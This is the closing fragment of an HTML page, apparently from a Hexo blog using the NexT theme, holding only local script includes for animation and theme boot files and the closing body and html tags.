  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
